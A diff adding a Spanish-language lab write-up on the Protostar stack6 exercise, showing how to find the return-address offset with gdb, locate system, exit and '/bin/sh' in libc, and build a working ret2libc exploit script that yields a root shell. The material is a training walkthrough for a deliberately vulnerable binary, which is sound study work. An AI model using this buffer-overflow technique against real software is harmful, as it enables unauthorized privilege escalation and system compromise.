@@ -215,3 +215,110 @@ Segmentation fault -> Aunque se queje nos ha ejecutado la win (el mensaje de ant
 0x80484e0:	 "code flow successfully changed"
 ```
 ---------------------------------------------------------------------------
+
+# Ret2libc -> [stack6](https://exploit.education/protostar/stack-six/)
+
+Con el stack 6 no podemos inyectar shellcode en la pila, ya que no nos permite volver a ella poniendola en el eip. Entonces como no hay shellcode, hay
+que aprovecharse de código que ya existe en el programa, en concreto las funciones de stdlib de C.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 75 )"| ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 76 )"| ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+A partir de las 76 da el SEGFAULT, pero dónde está el eip? Vamos a meter un patrón reconocible para ver dónde está.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 76 + 'BBBBCCCCDDDDEEEEFFFFGGGG' )" > /tmp/pattern
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
+(gdb) disas getpath
+... Muchas instrucciones :V
+0x080484f8 <getpath+116>:	leave
+(gdb) b *0x080484f8
+(gdb) run < /tmp/pattern
+Breakpoint alcanzado!
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault. 0x43434343 in ?? ()
+```
+0x43 son las C, asi que despues de 80 "A" (76 +4) está el eip.
+Para este ejercicio se usará la técnica de ret2libc ya que no se puede saltar a la pila (le metemos la direccion 0xbffff69c que es algo despues del eip)
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'* 80 + '\x9c\xf6\xff\xbf' )"| ./stack6
+input path please: bzzzt (0xbffff69c)
+```
+Para hacer ret2libc se tiene que conseguir estas tres direcciones y pasarselas como input:
+> **RET2LIBC:** offset + función(&system) + retorno(&exit) + argumentos("bin/sh") 
+
+Como hemos visto en la seccion de [estructura de un binario](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/Binarios/Estructura%20de%20un%20binario.md) Se le pasa al eip la dirección de la función system que es la que nos interesa ahora, una vez alli, sabemos que
+una función tiene un trozo de memoria donde está primero la dirección de retorno y luego los argumentos. 
+
+1. Se crea la pila con los arguemntos, que usa la función la funcion system("bin/sh")
+2. Se borran estos argumentos de la pila con *LEAVE* 
+3. Queda la direccion de retorno (a donde va cuando acaba) que se pasa al eip -> *POP EIP*
+
+¿Por tanto de dónde sacamos estas tres cosas?
+
+ * Dirección de "system"
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
+(gdb) run
+input path please: AAAA
+got path AAAA
+(gdb) p &system
+$1 = 0xb7ecffb0 <__libc_system>
+```
+* Dirección de "exit"
+
+```console
+(gdb) p &exit
+$2 = 0xb7ec60c0 <*__GI_exit>
+```
+ * String "bin/sh"
+
+```console
+(gdb) b *0x080484f8
+(gdb) run
+input path please: AAAA
+got path AAAA
+Breakpoint alcanzado!
+(gdb) info proc map
+	Start Addr   End Addr       Size     Offset objfile
+	...
+	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
+  ...  
+ 	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so -> La primera vez que sale esto (0xb7e97000)
+  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+[user@protostar]-[/opt/protostar/bin]:$ strings -atx /lib/libc-2.11.2.so | grep "bin/sh"
+ 11f3bf /bin/sh
+(gdb) x/s 0xb7e97000 + 0x11f3bf
+0xb7fb63bf:	 "/bin/sh"
+```
+Ya tenemos las tres direcciones, por tanto armamos el exploit
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ vim /tmp/exploit.py
+```
+```python
+import struct
+
+offset = 80
+padding = "A" * offset
+system = struct.pack("I",0xb7ecffb0)
+exit = struct.pack("I",0xb7ec60c0)
+bin_sh = struct.pack("I",0xb7fb63bf)
+print(padding + system + exit + bin_sh)
+```
+Hay que pasarselo entre parentesis y con el cat al final ya que sino el proceso que abre de consola se cierra al instante, y cat lo deja abierto
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack6
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��
+whoami
+root
+```
+
